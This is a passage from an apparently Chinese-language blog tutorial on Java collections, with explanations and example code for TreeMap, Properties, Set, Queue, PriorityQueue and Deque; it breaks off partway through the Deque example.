title="使用TreeMap"></a>使用TreeMap</h2><ul><li><code>SortedMap</code>在遍历时严格按照Key的顺序遍历，最常用的实现类是<code>TreeMap</code>；作为<code>SortedMap</code>的Key必须实现<code>Comparable</code>接口，或者传入<code>Comparator</code>；要严格按照<code>compare()</code>规范实现比较逻辑，否则，<code>TreeMap</code>将不能正常工作。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.coolestions.treemap;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionTreeMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        sortingMap();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Map&lt;String,Integer&gt; map = <span class="keyword">new</span> TreeMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;orange&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        map.put(<span class="string">&quot;apple&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        map.put(<span class="string">&quot;pear&quot;</span>,<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">for</span>(String key: map.keySet())&#123;</span><br><span class="line">            System.out.println(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sortingMap</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Map&lt;Person,Integer&gt; map = <span class="keyword">new</span> TreeMap&lt;&gt;(<span class="keyword">new</span> Comparator&lt;Person&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Person personOne, Person personTwo)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(personOne.score == personTwo.score)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> personOne.score &gt; personTwo.score ? -<span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        map.put(<span class="keyword">new</span> Person(<span class="string">&quot;Pan3a&quot;</span>,<span class="number">78</span>),<span class="number">1</span>);</span><br><span class="line">        map.put(<span class="keyword">new</span> Person(<span class="string">&quot;Forever404&quot;</span>,<span class="number">89</span>),<span class="number">2</span>);</span><br><span class="line">        map.put(<span class="keyword">new</span> Person(<span class="string">&quot;Bob&quot;</span>,<span class="number">62</span>),<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">for</span> (Person key : map.keySet())&#123;</span><br><span class="line">            System.out.println(key);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(map.get(<span class="keyword">new</span> Person(<span class="string">&quot;Bob&quot;</span>,<span class="number">62</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    Person(String name, <span class="keyword">int</span> score)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s: score=%d&#125;&quot;</span>,name,score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用Properties"><a href="#使用Properties" class="headerlink" title="使用Properties"></a>使用Properties</h2><ul><li>Java集合库提供的<code>Properties</code>用于读写配置文件<code>.properties</code>。<code>.properties</code>文件可以使用UTF-8编码。<br>可以从文件系统、classpath或其他任何地方读取<code>.properties</code>文件。<br>读写<code>Properties</code>时，注意仅使用<code>getProperty()</code>和<code>setProperty()</code>方法，不要调用继承而来的<code>get()</code>和<code>put()</code>等方法。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionProperties</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        testRead();</span><br><span class="line">        bytesCodeRead();</span><br><span class="line">        testWrite();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testRead</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//        为啥相对路径不行</span></span><br><span class="line">        String filePath = <span class="string">&quot;/Users/pan3a/CodeProject/JavaProject/src/setting.properties&quot;</span>;</span><br><span class="line">        Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            properties.load(<span class="keyword">new</span> FileInputStream(filePath));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException exception) &#123;</span><br><span class="line">            exception.printStackTrace();</span><br><span class="line">            System.out.println(exception);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String getFilePath = properties.getProperty(<span class="string">&quot;last_open_file&quot;</span>);</span><br><span class="line"><span class="comment">//        设置默认值120 当不存在该配置时</span></span><br><span class="line">        String getInterval = properties.getProperty(<span class="string">&quot;auto_sava_interval&quot;</span>,<span class="string">&quot;120&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(getFilePath);</span><br><span class="line">        System.out.println(getInterval);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bytesCodeRead</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String settings = <span class="string">&quot;# test&quot;</span> + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;course=Java&quot;</span> + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;last_open_date=2019-08-07T12:35:01&quot;</span>;</span><br><span class="line">        ByteArrayInputStream input = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            input = <span class="keyword">new</span> ByteArrayInputStream(settings.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            props.load(input);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;course: &quot;</span> + props.getProperty(<span class="string">&quot;course&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;last_open_date: &quot;</span> + props.getProperty(<span class="string">&quot;last_open_date&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;last_open_file: &quot;</span> + props.getProperty(<span class="string">&quot;last_open_file&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;auto_save: &quot;</span> + props.getProperty(<span class="string">&quot;auto_save&quot;</span>, <span class="string">&quot;60&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testWrite</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">        properties.setProperty(<span class="string">&quot;url&quot;</span>,<span class="string">&quot;https://www.baidu.com&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;language&quot;</span>,<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            properties.store(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;/Users/pan3a/CodeProject/JavaProject/src/setting.properties&quot;</span>),<span class="string">&quot;这是写入的注释&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用Set"><a href="#使用Set" class="headerlink" title="使用Set"></a>使用Set</h2><ul><li><code>Set</code>用于存储不重复的元素集合：放入<code>HashSet</code>的元素与作为<code>HashMap</code>的key要求相同；放入<code>TreeSet</code>的元素与作为<code>TreeMap</code>的Key要求相同；利用<code>Set</code>可以去除重复元素；遍历<code>SortedSet</code>按照元素的排序顺序遍历，也可以自定义排序算法。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionSet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        testSet();</span><br><span class="line">        treeSet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testSet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        System.out.println(set.add(<span class="string">&quot;Pan3a&quot;</span>));</span><br><span class="line">        System.out.println(set.add(<span class="string">&quot;Forever404&quot;</span>));</span><br><span class="line">        System.out.println(set.add(<span class="string">&quot;Pan3a&quot;</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(set.contains(<span class="string">&quot;Pan3a&quot;</span>));</span><br><span class="line">        System.out.println(set.remove(<span class="string">&quot;Panda&quot;</span>));</span><br><span class="line">        System.out.println(set.size());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">treeSet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------------&quot;</span>);</span><br><span class="line">        List&lt;Message&gt; messageList =  <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        messageList.add(<span class="keyword">new</span> Message(<span class="number">1</span>,<span class="string">&quot;Hello!&quot;</span>));</span><br><span class="line">        messageList.add(<span class="keyword">new</span> Message(<span class="number">2</span>,<span class="string">&quot;发工资了吗&quot;</span>));</span><br><span class="line">        messageList.add(<span class="keyword">new</span> Message(<span class="number">2</span>,<span class="string">&quot;发工资了吗&quot;</span>));</span><br><span class="line">        messageList.add(<span class="keyword">new</span> Message(<span class="number">3</span>,<span class="string">&quot;中午吃啥子&quot;</span>));</span><br><span class="line">        messageList.add(<span class="keyword">new</span> Message(<span class="number">3</span>,<span class="string">&quot;中午吃啥子&quot;</span>));</span><br><span class="line"></span><br><span class="line">        List&lt;Message&gt; displayMessages = process(messageList);</span><br><span class="line"><span class="comment">//        避免重复展示数据</span></span><br><span class="line">        <span class="keyword">for</span> (Message message : displayMessages)&#123;</span><br><span class="line">            System.out.println(message.text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> List&lt;Message&gt; <span class="title">process</span><span class="params">(List&lt;Message&gt; received)</span></span>&#123;</span><br><span class="line">        Set&lt;Message&gt; messageSet = <span class="keyword">new</span> TreeSet&lt;&gt;();</span><br><span class="line">        List&lt;Message&gt; messageListTwo = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(Message message : received)&#123;</span><br><span class="line">            messageSet.add(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Message message : messageSet)&#123;</span><br><span class="line">            messageListTwo.add(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> messageListTwo;</span><br><span class="line"><span class="comment">//        return received;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Message</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Message</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> sequence;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String text;</span><br><span class="line"></span><br><span class="line">    Message(<span class="keyword">int</span> sequence, String text) &#123;</span><br><span class="line">        <span class="keyword">this</span>.sequence = sequence;</span><br><span class="line">        <span class="keyword">this</span>.text = text;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Message message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.sequence == message.sequence)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sequence &gt; message.sequence ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用Queue"><a href="#使用Queue" class="headerlink" title="使用Queue"></a>使用Queue</h2><ul><li>队列<code>Queue</code>实现了一个先进先出（FIFO）的数据结构：通过<code>add()</code>&#x2F;<code>offer()</code>方法将元素添加到队尾；通过<code>remove()</code>&#x2F;<code>poll()</code>从队首获取元素并删除；通过<code>element()</code>&#x2F;<code>peek()</code>从队首获取元素但不删除。要避免把<code>null</code>添加到队列。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionQueue</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Queue&lt;String&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        queue.offer(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">        queue.offer(<span class="string">&quot;pear&quot;</span>);</span><br><span class="line">        queue.offer(<span class="string">&quot;banana&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(queue.poll());</span><br><span class="line"></span><br><span class="line">        System.out.println(queue.element());</span><br><span class="line">        System.out.println(queue.element());</span><br><span class="line"></span><br><span class="line">        System.out.println(queue.poll());</span><br><span class="line">        System.out.println(queue.poll());</span><br><span class="line">        System.out.println(queue.poll());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用PriorityQueue"><a href="#使用PriorityQueue" class="headerlink" title="使用PriorityQueue"></a>使用PriorityQueue</h2><ul><li><code>PriorityQueue</code>实现了一个优先队列：从队首获取元素时，总是获取优先级最高的元素。<code>PriorityQueue</code>默认按元素比较的顺序排序（必须实现<code>Comparable</code>接口），也可以通过<code>Comparator</code>自定义排序算法（元素就不必实现<code>Comparable</code>接口）。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionPriorityQueue</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        testPriorityQueue();</span><br><span class="line">        testUserPriorityQueue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testPriorityQueue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Queue&lt;String&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;&gt;();</span><br><span class="line">        queue.offer(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">        queue.offer(<span class="string">&quot;pear&quot;</span>);</span><br><span class="line">        queue.offer(<span class="string">&quot;banana&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(queue.poll());</span><br><span class="line">        System.out.println(queue.poll());</span><br><span class="line">        System.out.println(queue.poll());</span><br><span class="line">        System.out.println(queue.poll());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testUserPriorityQueue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line">        Queue&lt;User&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(<span class="keyword">new</span> UserComparator());</span><br><span class="line">        queue.offer(<span class="keyword">new</span> User(<span class="string">&quot;Bob&quot;</span>,<span class="string">&quot;A7&quot;</span>));</span><br><span class="line">        queue.offer(<span class="keyword">new</span> User(<span class="string">&quot;Alice&quot;</span>,<span class="string">&quot;A2&quot;</span>));</span><br><span class="line">        queue.offer(<span class="keyword">new</span> User(<span class="string">&quot;Pan3a&quot;</span>,<span class="string">&quot;V10&quot;</span>));</span><br><span class="line">        queue.offer(<span class="keyword">new</span> User(<span class="string">&quot;Jack&quot;</span>,<span class="string">&quot;A3&quot;</span>));</span><br><span class="line">        queue.offer(<span class="keyword">new</span> User(<span class="string">&quot;Hack&quot;</span>,<span class="string">&quot;V2&quot;</span>));</span><br><span class="line">        <span class="keyword">int</span> counts = queue.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> count = <span class="number">0</span>; count &lt; counts; count++) &#123;</span><br><span class="line">            System.out.println(queue.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String number;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name, String number)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.number = number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name + <span class="string">&quot;/&quot;</span> + number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserComparator</span> <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(User userOne, User userTwo)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(userOne.number.charAt(<span class="number">0</span>) == userTwo.number.charAt(<span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> userOne.number.compareTo(userTwo.number);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (userOne.number.startsWith(<span class="string">&quot;V&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用Deque"><a href="#使用Deque" class="headerlink" title="使用Deque"></a>使用Deque</h2><ul><li><code>Deque</code>实现了一个双端队列（Double Ended Queue），它可以： <ul><li>将元素添加到队尾或队首：<code>addLast()</code>&#x2F;<code>offerLast()</code>&#x2F;<code>addFirst()</code>&#x2F;<code>offerFirst()</code>；</li><li>从队首／队尾获取元素并删除：<code>removeFirst()</code>&#x2F;<code>pollFirst()</code>&#x2F;<code>removeLast()</code>&#x2F;<code>pollLast()</code>；</li><li>从队首／队尾获取元素但不删除：<code>getFirst()</code>&#x2F;<code>peekFirst()</code>&#x2F;<code>getLast()</code>&#x2F;<code>peekLast()</code>；</li><li>总是调用<code>xxxFirst()</code>&#x2F;<code>xxxLast()</code>以便与<code>Queue</code>的方法区分开；</li><li>避免把<code>null</code>添加到队列。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Deque;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionDeque</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Deque&lt;String&gt; deque = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        deque.offerLast(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        deque.offerLast(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        deque.offerFirst(<span class="string">&quot;C&quot;</span>);                  <span class="comment">// C &lt;= A &lt;= B</span></span><br><span class="line">        System.out.println(deque.pollFirst());</span><br><span class="line">        System.out.println(deque.pollLast());</span><br><span class="line">        System.out.println(deque.pollFirst());</span><br><span class="line">    &#125;</span><br><span 